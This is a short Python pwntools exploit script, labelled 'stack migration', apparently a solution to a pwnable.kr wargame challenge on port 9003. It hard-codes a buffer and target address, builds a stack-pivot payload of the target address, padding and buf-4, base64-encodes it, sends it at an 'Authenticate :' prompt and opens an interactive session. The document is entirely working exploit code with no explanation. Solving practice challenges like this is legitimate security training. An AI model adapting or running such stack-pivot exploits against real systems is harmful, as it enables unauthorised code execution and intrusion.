###stack migration

from pwn import *

###Addr
buf = 0x811eb40
target = 0x8049284

###Exploit
r = remote('pwnable.kr',9003)
payload = p32(target)+b'a'*4+p32(buf-4)
payload = b64e(payload)
r.sendlineafter('Authenticate : ',payload)
r.interactive()
